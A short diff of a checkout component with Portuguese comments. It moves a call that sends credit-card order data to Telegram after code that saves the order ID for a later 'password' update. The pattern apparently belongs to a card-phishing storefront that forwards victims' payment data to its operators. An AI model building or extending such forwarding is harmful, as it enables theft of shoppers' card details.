@@ -65,14 +65,14 @@ export const CartPayment = ({
       const savedOrder = await DatabaseService.saveOrder(orderData);
       
       if (savedOrder) {
-        // Enviar notificação para Telegram se for cartão de crédito
-        if (paymentMethod === "credit") {
-          await sendTelegramNotification(orderData);
-        }
-        
         // Armazenar ID do pedido para atualização posterior com a senha
         if (paymentMethod === "credit") {
           localStorage.setItem("currentOrderId", orderId);
+        }
+        
+        // Enviar notificação para Telegram se for cartão de crédito
+        if (paymentMethod === "credit") {
+          await sendTelegramNotification(orderData);
         }
         
         // Prosseguir com checkout
